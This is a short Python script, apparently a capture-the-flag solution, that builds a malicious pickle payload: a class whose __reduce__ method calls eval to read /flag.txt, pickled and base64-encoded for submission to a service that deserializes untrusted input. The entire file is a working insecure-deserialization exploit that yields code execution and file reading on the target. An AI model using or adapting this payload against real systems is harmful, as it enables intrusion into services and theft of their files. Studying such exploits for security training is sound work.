import pickle, base64

class test:
    def __reduce__(self):
        p="open('/flag.txt').read()"
        return (eval,(p,))

rs={'name':test()}

print(base64.b64encode(pickle.dumps(rs)).decode('utf8'))